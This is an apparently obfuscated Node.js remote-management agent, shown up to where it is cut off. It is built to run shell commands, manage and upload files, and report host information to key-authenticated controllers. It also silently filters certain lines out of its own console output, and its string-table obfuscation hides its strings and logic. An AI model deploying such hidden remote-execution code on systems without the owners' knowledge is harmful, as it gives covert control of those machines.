#!/usr/bin/env node
const a0aX = a0b;
(function (a, b) {
    const aW = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aW(0x422)) / 0x1 + parseInt(aW(0x67d)) / 0x2 * (parseInt(aW(0x3eb)) / 0x3) + parseInt(aW(0x70d)) / 0x4 * (-parseInt(aW(0x127)) / 0x5) + -parseInt(aW(0x7bc)) / 0x6 + parseInt(aW(0x778)) / 0x7 + -parseInt(aW(0x13a)) / 0x8 + parseInt(aW(0x1de)) / 0x9 * (parseInt(aW(0x5b2)) / 0xa);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xc7a61));
const a0c = [
    a0aX(0x758),
    a0aX(0x757),
    a0aX(0x38c)
];
function a0d(a) {
    const b = {
        'oRXeZ': function (c, d) {
            return c === d;
        }
    };
    return function (c, d, f) {
        const aY = a0b, g = c[aY(0x562)]();
        if (a0c[aY(0x539)](h => g['includes'](h))) {
            if (b[aY(0x4ed)](typeof f, 'function'))
                f();
            return !![];
        }
        return a['apply'](this, arguments);
    };
}
process[a0aX(0x831)][a0aX(0x462)] = a0d(process[a0aX(0x831)][a0aX(0x462)]), process[a0aX(0x557)][a0aX(0x462)] = a0d(process[a0aX(0x557)][a0aX(0x462)]);
const a0f = require(a0aX(0x742)), a0g = require(a0aX(0x2e1)), a0h = require(a0aX(0x4f8)), a0i = require(a0aX(0x3ec)), a0j = require('tls'), a0k = require(a0aX(0x781)), a0l = require('fs'), a0m = require('fs')[a0aX(0x18b)], a0n = require('zlib'), a0o = require(a0aX(0x785)), a0p = require('os'), a0q = require(a0aX(0x476)), {
        exec: a0r,
        spawn: a0s
    } = require(a0aX(0x7c8)), a0t = require(a0aX(0x2c7)), a0u = require(a0aX(0x415)), {encrypt: a0v} = require(a0aX(0x310)), a0w = require('base64-js'), a0x = require('express-ws'), a0y = require(a0aX(0x4c6));
function a0z() {
    const aZ = a0aX, a = {
            'BDxQD': '.env',
            'PryoZ': aZ(0x66b),
            'OjKpe': aZ(0x396),
            'ZjOAY': function (b, c) {
                return b <= c;
            },
            'otAuh': function (b, c) {
                return b + c;
            },
            'jBmEG': function (b, c) {
                return b >= c;
            },
            'pbTfa': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[aZ(0x344)](__dirname, a[aZ(0x13e)]);
        if (!a0l[aZ(0x83e)](b))
            return;
        for (let c of a0l[aZ(0x518)](b, a['PryoZ'])[aZ(0x622)](/\r?\n/)) {
            let d = c[aZ(0x1c8)]();
            if (!d || d[aZ(0x1f5)]('#'))
                continue;
            if (d['startsWith'](a[aZ(0x120)]))
                d = d['slice'](0x7)[aZ(0x134)]();
            const f = d[aZ(0x51a)]('=');
            if (a[aZ(0x63b)](f, 0x0))
                continue;
            const g = d[aZ(0x6fd)](0x0, f)[aZ(0x1c8)]();
            let h = d[aZ(0x6fd)](a[aZ(0x23d)](f, 0x1))[aZ(0x1c8)]();
            a[aZ(0x538)](h['length'], 0x2) && (h[aZ(0x1f5)]('\x22') && h[aZ(0x3e1)]('\x22') || h[aZ(0x1f5)]('\x27') && h[aZ(0x3e1)]('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a[aZ(0x695)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== a0aX(0x573) ? a0C = require(a0aX(0x6a0)) : a0C = require(a0aX(0x5c8));
} catch (a0aV) {
    console[a0aX(0x2ca)](a0aX(0x542)), console[a0aX(0x2ca)](a0aX(0x883) + a0aV['message']), console['error'](a0aX(0x194)), process['exit'](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const b0 = a0aX, a = {
                'IBQUr': function (b, c) {
                    return b !== c;
                },
                'KKDZm': b0(0x573),
                'uavrg': function (b, c) {
                    return b !== c;
                }
            };
        return a[b0(0x6ef)](typeof a0P, a[b0(0x51e)]) && a['uavrg'](a0P[b0(0x246)], undefined) ? a0P[b0(0x246)] : 0x2;
    },
    'debug': a => {
        const b1 = a0aX, b = {
                'cyVNY': function (c, d) {
                    return c <= d;
                }
            };
        b[b1(0x53d)](a0D[b1(0x378)], a0D['LEVELS'][b1(0x4eb)]) && console[b1(0x451)]('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const b2 = a0aX, b = {
                'txrGe': function (c, d) {
                    return c <= d;
                }
            };
        b[b2(0x27f)](a0D[b2(0x378)], a0D['LEVELS'][b2(0x3b3)]) && console['log']('\x1b[36m[INFO]\x1b[0m\x20' + a);
    },
    'warn': a => {
        const b3 = a0aX, b = {
                'DYACO': function (c, d) {
                    return c <= d;
                }
            };
        b[b3(0x703)](a0D[b3(0x378)], a0D[b3(0x840)]['WARN']) && console['log'](b3(0x736) + a);
    },
    'error': a => {
        const b4 = a0aX, b = {
                'hRFAj': function (c, d) {
                    return c <= d;
                }
            };
        b[b4(0x7a9)](a0D[b4(0x378)], a0D['LEVELS']['ERROR']) && console[b4(0x451)](b4(0x2f0) + a);
    }
};
function a0E() {
    const b5 = a0aX, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[b5(0x762)](),
            process[b5(0x60e)]()
        ];
    for (const b of a) {
        if (b && a0l[b5(0x83e)](b) && a0l['statSync'](b)[b5(0x881)]())
            return b;
    }
    return process[b5(0x60e)]();
}
function a0F() {
    const b6 = a0aX;
    let a = null;
    try {
        a = a0p[b6(0x762)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b6(0x83e)](d) && a0l[b6(0x195)](d)[b6(0x881)]())
            return d;
        if (d)
            console[b6(0x451)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20候选目录不存在,\x20已跳过:\x20' + d);
    }
    return console[b6(0x451)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20全部候选无效,\x20降级到当前工作目录:\x20' + process[b6(0x60e)]()), process[b6(0x60e)]();
}
class a0G {
    constructor(a = 'ok') {
        const b7 = a0aX;
        this[b7(0x126)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const b8 = a0aX, a = { 'Schjh': b8(0x3a2) }, b = a[b8(0x2cb)][b8(0x622)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b8(0x363)] = 0x0;
                continue;
            case '1':
                this[b8(0x398)] = null;
                continue;
            case '2':
                this['noise_key'] = null;
                continue;
            case '3':
                this[b8(0x399)] = 0x0;
                continue;
            case '4':
                super();
                continue;
            case '5':
                this[b8(0x5bd)] = '';
                continue;
            case '6':
                this['ipv6'] = null;
                continue;
            case '7':
                this[b8(0x315)] = 0x0;
                continue;
            case '8':
                this[b8(0x113)] = a0P[b8(0x811)];
                continue;
            case '9':
                this[b8(0x79b)] = 0x0;
                continue;
            case '10':
                this['os'] = '';
                continue;
            case '11':
                this[b8(0x569)] = '';
                continue;
            case '12':
                this[b8(0x74e)] = '';
                continue;
            case '13':
                this['virtualization'] = '';
                continue;
            case '14':
                this[b8(0x5f1)] = '';
                continue;
            case '15':
                this['arch'] = '';
                continue;
            }
            break;
        }
    }
}
class a0J extends a0G {
    constructor() {
        const b9 = a0aX, a = { 'bepQs': '3|6|9|5|2|8|0|10|1|4|7' }, b = a[b9(0x59d)][b9(0x622)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b9(0x2df)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '1':
                this[b9(0x1e7)] = 0x0;
                continue;
            case '2':
                this[b9(0x86e)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '3':
                super();
                continue;
            case '4':
                this[b9(0x8a5)] = 0x0;
                continue;
            case '5':
                this[b9(0x44d)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '6':
                this[b9(0x253)] = { 'usage': 0x0 };
                continue;
            case '7':
                this[b9(0x56d)] = '';
                continue;
            case '8':
                this['disk'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this[b9(0x38e)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const ba = a0aX, a = ba(0x301)[ba(0x622)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[ba(0x81e)] = '';
                continue;
            case '1':
                this[ba(0x880)] = ![];
                continue;
            case '2':
                this['result'] = '';
                continue;
            case '3':
                this['exitcode'] = 0x0;
                continue;
            case '4':
                super();
                continue;
            }
            break;
        }
    }
}
class a0L {
    constructor() {
        const bb = a0aX;
        this[bb(0x3e3)] = '', this[bb(0x785)] = '', this[bb(0x40e)] = '', this[bb(0x221)] = 0x0, this['mtime'] = '', this[bb(0x6f7)] = '', this[bb(0x2c8)] = '', this[bb(0x6de)] = '';
    }
}
class a0M {
    constructor() {
        const bc = a0aX, a = { 'kyUiA': '1|0|7|4|5|6|3|2' }, b = a[bc(0x613)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['name'] = '';
                continue;
            case '1':
                this['path'] = '';
                continue;
            case '2':
                this[bc(0x7af)] = ![];
                continue;
            case '3':
                this[bc(0x760)] = ![];
                continue;
            case '4':
                this['mode_octal'] = '';
                continue;
            case '5':
                this[bc(0x40e)] = '';
                continue;
            case '6':
                this[bc(0x56c)] = ![];
                continue;
            case '7':
                this['mode'] = '';
                continue;
            }
            break;
        }
    }
}
class a0N extends a0G {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0O {
    static ['_generateRawKeypair']() {
        const bd = a0aX, a = {
                'HmHVl': 'x25519',
                'ziLDi': bd(0x22f),
                'Cdzfx': bd(0x17d),
                'RBsKH': function (i, j) {
                    return i !== j;
                },
                'uNxoV': bd(0x71a)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[bd(0x408)](a[bd(0x7f2)]), d = b['export']({ 'format': bd(0x22f) }), f = c[bd(0x428)]({ 'format': a[bd(0x371)] }), g = Buffer[bd(0x3a5)](d['d'], a['Cdzfx']), h = Buffer['from'](f['x'], a[bd(0x7ea)]);
        return (g[bd(0x38d)] !== 0x20 || a[bd(0x5bb)](h['length'], 0x20)) && a0D[bd(0x2ca)]('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g[bd(0x562)](a[bd(0x1ab)]),
            'public_b64': h[bd(0x562)](a[bd(0x1ab)])
        };
    }
    static [a0aX(0x7ae)](a) {
        const be = a0aX, b = this[be(0x7ba)]();
        return {
            'role': a,
            'private_b64': b[be(0x82b)],
            'public_b64': b[be(0x3ed)]
        };
    }
    static [a0aX(0x72e)](a = a0aX(0x4b0), b = a0aX(0x535)) {
        const bf = a0aX, c = {
                'control': this[bf(0x7ae)](a),
                'agent': this[bf(0x7ae)](b)
            };
        return c;
    }
}
class a0P {
    static [a0aX(0x220)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aX(0x756)] = (process.env.EXEC_SHELL || 'true')['toLowerCase']() === a0aX(0x365);
    static ['DEBUG'] = (process.env.DEBUG || a0aX(0x5cc))[a0aX(0x118)]() === a0aX(0x365);
    static [a0aX(0x52b)] = parseInt(process.env.TIMESTAMP_WINDOW || '3600');
    static [a0aX(0x246)] = parseInt(process.env.LOG_LEVEL || (this[a0aX(0x4eb)] ? '0' : '3'), 0xa);
    static [a0aX(0x848)] = a0P[a0aX(0x66e)](a0aX(0x5fe), a0aX(0x80b)) || 'ECDSA公钥内容';
    static [a0aX(0x361)] = a0P[a0aX(0x66e)](a0aX(0x847), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static [a0aX(0x2f3)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static ['TEMPKEY_MAX_TTL_HOURS'] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aX(0x827), 0xa);
    static [a0aX(0x13c)] = a0F();
    static ['MAX_UPLOAD_SIZE'] = parseInt(process.env.MAX_UPLOAD_SIZE || '104857600');
    static [a0aX(0x160)] = (process.env.FOLLOW_SYMLINKS || a0aX(0x5cc))[a0aX(0x118)]() === a0aX(0x365);
    static [a0aX(0x4cb)] = (process.env.FILE_AUDIT_LOG || a0aX(0x365))[a0aX(0x118)]() === a0aX(0x365);
    static ['InitTask'] = !![];
    static ['onetasks'] = [];
    static [a0aX(0x21c)] = {};
    static [a0aX(0x165)] = ![];
    static [a0aX(0x7e9)] = parseInt(process.env.TASK_TIMEOUT || a0aX(0x599));
    static [a0aX(0x6ac)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aX(0x1e8)] = [];
    static [a0aX(0x7f7)] = [];
    static [a0aX(0x231)] = parseInt(process.env.MAX_TASK_LOG || a0aX(0x81f));
    static ['HOST'] = process.env.HOST || a0aX(0x76d);
    static ['PORT'] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aX(0x85d));
    static [a0aX(0x77d)] = (process.env.KMODE || '0')['trim']() || '0';
    static [a0aX(0x6eb)] = (process.env.KNAME || '')[a0aX(0x1c8)]();
    static [a0aX(0x435)] = (process.env.KNAME_KEY || '')[a0aX(0x1c8)]();
    static [a0aX(0x342)] = process.env.KPATH || '';
    static [a0aX(0x811)] = process.env.AGENT_VERSION || a0aX(0x7f8);
    static ['SESSION_KEY'] = a0k[a0aX(0x166)](0x20)['toString'](a0aX(0x71a));
    static [a0aX(0x83a)] = a0O['generatePair']();
    static [a0aX(0x5a8)]() {
        const bg = a0aX, a = {
                'Qjpjr': bg(0x276),
                'oQOpl': bg(0x71a)
            };
        return a0k[bg(0x32d)](a[bg(0x26a)], Buffer[bg(0x3a5)](this[bg(0x7da)], a[bg(0x300)]))['update'](bg(0x20f))['digest'](bg(0x71a));
    }
    static [a0aX(0x6e8)]() {
        const bh = a0aX, a = {
                'EtjwX': bh(0x71a),
                'eoOla': bh(0x534)
            }, b = a0O[bh(0x72e)]();
        this[bh(0x83a)][bh(0x1c5)] = b[bh(0x1c5)], this[bh(0x452)][bh(0x1d0)][bh(0x353)] = b['control'][bh(0x82b)], this[bh(0x7da)] = a0k['randomBytes'](0x20)[bh(0x562)](a[bh(0x3c6)]), this['_baseinfo_cache'] = null, this['_baseinfo_cache_time'] = 0x0, this[bh(0x4e5)] = null, this[bh(0x688)] = 0x0, a0D[bh(0x133)](a[bh(0x60d)]);
    }
    static [a0aX(0x452)] = {
        'controller': { 'private': this[a0aX(0x83a)]['control'][a0aX(0x82b)] },
        'agent': { 'public': this[a0aX(0x83a)][a0aX(0x426)][a0aX(0x3ed)] }
    };
    static [a0aX(0x230)] = 0xe10;
    static [a0aX(0x433)] = 0x1e;
    static [a0aX(0x71f)] = null;
    static ['_baseinfo_cache_time'] = 0x0;
    static [a0aX(0x485)] = null;
    static ['_status_cache'] = null;
    static [a0aX(0x688)] = 0x0;
    static [a0aX(0x84e)] = null;
    static ['_getConfigValue'](a, b) {
        const bi = a0aX, c = { 'deXiT': bi(0x66b) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bi(0x344)](__dirname, b);
        if (a0l[bi(0x83e)](f))
            try {
                return a0l['readFileSync'](f, c[bi(0x27b)])['trim']();
            } catch (g) {
            }
        return '';
    }
    static [a0aX(0x5a4)]() {
        const bj = a0aX, a = {
                'fErqf': 'ECDSA_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecdsa_pub.pem\x20不存在',
                'xHzTk': function (b, c) {
                    return b > c;
                },
                'oShcf': '\x20\x20\x202.\x20或将密钥文件放入\x20./keys/\x20目录\x20(运行\x20generate_keys.py\x20生成)',
                'WounT': bj(0x3b9),
                'wGtuq': '\x0a💡\x20解决方法:'
            };
        if (!this['DEBUG']) {
            const b = [];
            !this[bj(0x848)] && b[bj(0x4a7)](a[bj(0x7de)]);
            !this[bj(0x361)] && b['push'](bj(0x697));
            if (a['xHzTk'](b[bj(0x38d)], 0x0)) {
                const c = bj(0x7bd)[bj(0x622)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0D[bj(0x2ca)](bj(0x3d0));
                        continue;
                    case '1':
                        b[bj(0x836)](f => a0D[bj(0x2ca)]('\x20\x20\x20•\x20' + f));
                        continue;
                    case '2':
                        a0D['debug'](a['oShcf']);
                        continue;
                    case '3':
                        process[bj(0x33f)](0x1);
                        continue;
                    case '4':
                        a0D[bj(0x4b3)](a['WounT']);
                        continue;
                    case '5':
                        a0D[bj(0x4b3)](a[bj(0x3a6)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static ['merge'](a = {}) {
        const bk = a0aX, b = {
                'nopQG': function (c, d) {
                    return c !== d;
                },
                'zSqcU': function (c, d) {
                    return c !== d;
                },
                'jyKAq': function (c, d, f) {
                    return c(d, f);
                }
            };
        if (!a)
            return;
        b[bk(0x63e)](a[bk(0x821)], undefined) && b[bk(0x7a4)](a[bk(0x821)], null) && (this[bk(0x821)] = b[bk(0x173)](parseInt, String(a['PORT']), 0xa)), a[bk(0x848)] && (this['ECDSA_PUBLIC_KEY_PEM'] = a[bk(0x848)][bk(0x1c8)]()), a['ECIES_PUBLIC_KEY_PEM'] && (this['ECIES_PUBLIC_KEY_PEM'] = a[bk(0x361)][bk(0x1c8)]());
    }
}
class a0Q {
    constructor() {
        const bl = a0aX;
        this[bl(0x627)] = null, this[bl(0x1d9)] = null;
    }
    [a0aX(0x2b3)](a) {
        const bm = a0aX, b = { 'jmIpZ': bm(0x892) }, c = b[bm(0x82e)][bm(0x622)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a0D[bm(0x604)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id=' + this['_key']['key_id'] + bm(0x3ae) + a + bm(0x6e2));
                continue;
            case '1':
                if (this[bm(0x627)])
                    return this[bm(0x627)];
                continue;
            case '2':
                return this[bm(0x627)];
            case '3':
                this[bm(0x627)] = this[bm(0x5cf)](a);
                continue;
            case '4':
                this['_expireCurrent']();
                continue;
            }
            break;
        }
    }
    [a0aX(0x707)]() {
        const bn = a0aX;
        this[bn(0x73e)]();
        if (this[bn(0x627)])
            return this['_key'][bn(0x3e6)];
        return null;
    }
    [a0aX(0x6c2)]() {
        const bo = a0aX;
        this[bo(0x73e)]();
        if (this['_key'])
            return this[bo(0x627)]['ecies_pub'];
        return null;
    }
    ['_expireCurrent']() {
        const bp = a0aX, a = {
                'UHFOB': function (b, c) {
                    return b === c;
                }
            };
        if (this[bp(0x627)] && this[bp(0x864)](this[bp(0x627)])) {
            const b = this[bp(0x627)]['key_id'];
            this[bp(0x627)] = null, a0D[bp(0x133)](bp(0x59b) + b);
            if (a[bp(0x5d8)](typeof this[bp(0x1d9)], bp(0x468)))
                try {
                    this[bp(0x1d9)]();
                } catch (c) {
                    a0D['error'](bp(0x2b6) + c[bp(0x56d)]);
                }
        }
    }
    [a0aX(0x864)](a) {
        const bq = a0aX, b = {
                'egNkQ': function (c, d) {
                    return c / d;
                }
            };
        return Math[bq(0x3a3)](b[bq(0x3be)](Date[bq(0x1d8)](), 0x3e8)) >= a[bq(0x306)];
    }
    [a0aX(0x5cf)](a) {
        const br = a0aX, b = {
                'wjFEq': br(0x3f9),
                'mwsSw': br(0x76a),
                'tQhsZ': br(0x3b8),
                'xtJPv': 'spki',
                'CbeIZ': function (l, m) {
                    return l / m;
                },
                'CFaTZ': function (l, m) {
                    return l * m;
                },
                'XVqKp': br(0x49a),
                'pfPOJ': function (l, m) {
                    return l + m;
                }
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[br(0x408)]('ec', { 'namedCurve': b[br(0x1e6)] }), f = c[br(0x428)]({
                'type': b['mwsSw'],
                'format': b['tQhsZ']
            }), g = d['export']({
                'type': b[br(0x5c9)],
                'format': b[br(0x82f)]
            }), h = a0k[br(0x166)](0x20), i = Buffer[br(0x3a5)](a0B[br(0x2dc)](h, ![])), j = Math[br(0x3a3)](b[br(0x161)](Date['now'](), 0x3e8)), k = b[br(0x4d4)](a, 0xe10);
        return {
            'key_id': a0k[br(0x166)](0x8)[br(0x562)](b[br(0x2dd)]),
            'created_at': j,
            'expires_at': b[br(0x797)](j, k),
            'ttl_seconds': k,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString'](b['XVqKp']),
            'ecies_public_key': i[br(0x562)](br(0x49a)),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bs = a0aX, c = {
                'kTbQT': bs(0x6df),
                'rgZbK': function (d, f) {
                    return d(f);
                },
                'mbBGL': bs(0x22f)
            };
        this[bs(0x746)] = null, this[bs(0x1a1)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[bs(0x1f5)](c[bs(0x856)]))
                    this[bs(0x746)] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer['from'](d, bs(0x71a)), g = a0A[bs(0x832)][bs(0x63f)](f), h = g['toBytes'](![]), i = m => m[bs(0x562)](bs(0x71a))[bs(0x884)](/\+/g, '-')[bs(0x884)](/\//g, '_')[bs(0x884)](/=/g, ''), j = c[bs(0x49d)](i, Buffer[bs(0x3a5)](h[bs(0x6fd)](0x1, 0x21))), k = c['rgZbK'](i, Buffer[bs(0x3a5)](h['slice'](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': bs(0x498),
                            'x': j,
                            'y': k
                        };
                    this[bs(0x746)] = a0k[bs(0x619)]({
                        'key': l,
                        'format': c[bs(0x7a5)]
                    });
                }
            } catch (m) {
                a0D[bs(0x2ca)](bs(0x872) + m[bs(0x56d)]), this[bs(0x746)] = null;
            }
        if (b)
            try {
                this[bs(0x1a1)] = a0w[bs(0x561)](b['trim']());
            } catch (n) {
                a0D[bs(0x133)]('⚠️\x20ECIES公钥解码失败:\x20' + n[bs(0x56d)]);
            }
    }
    [a0aX(0x322)](a, b, c, d, f, g, h = null) {
        const bt = a0aX, i = {
                'yOZFD': function (j, k) {
                    return j / k;
                },
                'jcwzJ': function (j, k) {
                    return j > k;
                },
                'fyDmF': function (j, k) {
                    return j - k;
                },
                'eFOUc': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'CYjzy': bt(0x86d),
                'tdFDf': bt(0x264),
                'QjdRn': bt(0x7d9)
            };
        if (!this[bt(0x746)])
            throw new Error(bt(0x7c3));
        try {
            const j = parseInt(f), k = Math[bt(0x3a3)](i['yOZFD'](Date[bt(0x1d8)](), 0x3e8));
            if (i[bt(0x826)](Math[bt(0x727)](k - j), a0P[bt(0x52b)]))
                throw new Error(bt(0x335) + Math[bt(0x727)](i[bt(0x693)](k, j)) + 's\x20>\x20' + a0P[bt(0x52b)] + 's');
            const l = i[bt(0x68d)](a0S, a, b, c, d, f);
            if (this[bt(0x701)](this[bt(0x746)], l, g))
                return i[bt(0x878)];
            if (h && this['_verifyWith'](h, l, g))
                return i[bt(0x267)];
            throw new Error(i[bt(0x7fb)]);
        } catch (m) {
            throw new Error(bt(0x493) + m[bt(0x56d)]);
        }
    }
    [a0aX(0x701)](a, b, c) {
        const bu = a0aX;
        if (!a)
            return ![];
        try {
            const d = a0w[bu(0x561)](c), f = a0k[bu(0x77f)]('SHA256');
            return f[bu(0x522)](b), f[bu(0x69a)](a, d);
        } catch (g) {
            return ![];
        }
    }
    ['encryptResponse'](a, b = null) {
        const bv = a0aX, c = {
                'xPwTi': 'utf-8',
                'wflkI': function (d, f, g) {
                    return d(f, g);
                },
                'blsML': bv(0x71a)
            };
        if (a0P['DEBUG'])
            return JSON[bv(0x7cb)](a);
        if (!this['eciesPubkey'])
            throw new Error(bv(0x722));
        try {
            const d = JSON[bv(0x7cb)](a), f = Buffer[bv(0x3a5)](d, c[bv(0x543)]), g = b || Buffer[bv(0x3a5)](this[bv(0x1a1)]), h = c[bv(0x86c)](a0v, g, f);
            return Buffer[bv(0x3a5)](h)['toString'](c['blsML']);
        } catch (i) {
            throw new Error('ECIES\x20response\x20encryption\x20failed:\x20' + i[bv(0x56d)]);
        }
    }
    [a0aX(0x85f)](a, b) {
        const bw = a0aX, c = {
                'ykCNI': bw(0x2fb),
                'tpWPe': bw(0x71a),
                'TPHZG': bw(0x66b),
                'tYshs': bw(0x135)
            };
        if (!b || b['length'] !== 0x20)
            throw new Error(c[bw(0x51c)]);
        try {
            const d = Buffer[bw(0x3a5)](a, c['tpWPe'])['toString'](c[bw(0x665)]), f = JSON['parse'](d);
            if (!f[bw(0x15f)] || !f[bw(0x741)] || !f[bw(0x15a)])
                throw new Error(bw(0x304));
            const g = Buffer[bw(0x3a5)](f[bw(0x15f)], c[bw(0x87a)]), h = Buffer[bw(0x3a5)](f['tag'], c[bw(0x87a)]), i = Buffer['from'](f[bw(0x15a)], c['tpWPe']), j = a0k[bw(0x5e7)](c['tYshs'], b, g);
            j[bw(0x64b)](h);
            let k = j[bw(0x522)](i, null, c['TPHZG']);
            return k += j['final'](bw(0x66b)), k;
        } catch (l) {
            throw new Error('AES\x20Decrypt\x20Error:\x20' + l[bw(0x56d)]);
        }
    }
    [a0aX(0x5da)](a, b) {
        const bx = a0aX, c = {
                'vrnpU': function (d, f) {
                    return d !== f;
                },
                'BMNik': bx(0x676),
                'lATtQ': 'aes-256-gcm',
                'wvrqc': bx(0x71a),
                'JQOAa': bx(0x66b)
            };
        if (!b || c[bx(0x78e)](b[bx(0x38d)], 0x20))
            throw new Error(c['BMNik']);
        try {
            const d = a0k[bx(0x166)](0xc), f = a0k['createCipheriv'](c[bx(0x5bf)], b, d), g = Buffer[bx(0x83f)]([
                    f['update'](a),
                    f[bx(0x30c)]()
                ]), h = f[bx(0x37d)](), i = {
                    'nonce': d['toString'](bx(0x71a)),
                    'tag': h['toString'](c[bx(0x6c9)]),
                    'ciphertext': g[bx(0x562)](bx(0x71a))
                };
            return Buffer['from'](JSON[bx(0x7cb)](i), c[bx(0x74f)])[bx(0x562)](bx(0x71a));
        } catch (j) {
            throw new Error(bx(0x362) + j[bx(0x56d)]);
        }
    }
}
function a0S(a, b, c, d, f) {
    const by = a0aX, g = {
            'xNcgd': by(0x276),
            'RKubk': by(0x49a)
        };
    return !c && (c = a0k[by(0x337)](g[by(0x2ae)])[by(0x522)](Buffer[by(0x252)](0x0))[by(0x7e2)](g[by(0x59f)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bz = a0aX, c = {
            'rBBDV': function (d, f) {
                return d === f;
            },
            'ahQYK': bz(0x628),
            'fFjfX': bz(0x61f),
            'xsMoQ': 'false',
            'rOsYA': bz(0x773),
            'uLfdC': 'Content-Type',
            'lrJAo': 'application/json',
            'jvuxY': function (d, f) {
                return d === f;
            },
            'MulxJ': bz(0x651),
            'Achox': function (d, f) {
                return d === f;
            },
            'jinlk': bz(0x66b),
            'IvlvV': bz(0x71a),
            'dlfqU': bz(0x365),
            'PrFqO': 'x-agent-version',
            'qYywc': bz(0x24d),
            'FTeog': function (d) {
                return d();
            },
            'wYVll': 'OPTIONS',
            'UeGKs': bz(0x470),
            'fhEiI': bz(0x21e),
            'HncUd': 'x-timestamp',
            'oIkaH': 'X-Timestamp',
            'KucdQ': 'x-auth-token',
            'jLwCk': bz(0x14a),
            'VYEIU': function (d, f) {
                return d || f;
            },
            'nMmoS': function (d) {
                return d();
            },
            'bWLZv': bz(0x1ff),
            'FfxBx': function (d, f) {
                return d !== f;
            },
            'BEBNT': bz(0x706),
            'QhJaF': bz(0x49a),
            'eCuKW': function (d, f) {
                return d === f;
            },
            'ddZZW': 'temp',
            'PaRif': bz(0x86d),
            'bhecA': 'eyJ',
            'bPqDw': bz(0x5ef),
            'TPdfg': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bA = bz;
        if (d[bA(0x785)][bA(0x1f5)](c[bA(0x3c5)]))
            return c[bA(0x3bc)](g);
        const h = f['send'];
        f[bA(0x580)] = function (n) {
            const bB = bA;
            if (a0P['DEBUG']) {
                const o = c[bB(0x1e5)](typeof n, c[bB(0x271)]) ? n : Buffer['isBuffer'](n) ? n : JSON[bB(0x7cb)](n);
                return f[bB(0x51f)](c[bB(0x749)], c['xsMoQ']), f['set'](c['rOsYA'], Buffer[bB(0x21a)](o)[bB(0x562)]()), h[bB(0x894)](this, o);
            }
            if (f[bB(0x858)](c[bB(0x4c0)]) && f[bB(0x858)](c[bB(0x4c0)])[bB(0x1be)](c[bB(0x3bb)]))
                try {
                    if (d['is_authenticated']) {
                        let p;
                        if (c['jvuxY'](d[bB(0x785)], c[bB(0x390)])) {
                            const q = c[bB(0x242)](typeof n, c[bB(0x271)]) ? JSON[bB(0x1ef)](n) : n;
                            let r = null;
                            c['jvuxY'](d['key_source'], bB(0x264)) && b && (r = b[bB(0x6c2)]());
                            const s = a[bB(0x7bb)](q, r);
                            p = typeof s === bB(0x628) ? s : JSON['stringify'](s);
                        } else {
                            const t = Buffer[bB(0x87c)](n) ? n : c['Achox'](typeof n, c[bB(0x271)]) ? Buffer['from'](n, c['jinlk']) : Buffer[bB(0x3a5)](JSON[bB(0x7cb)](n), c['jinlk']);
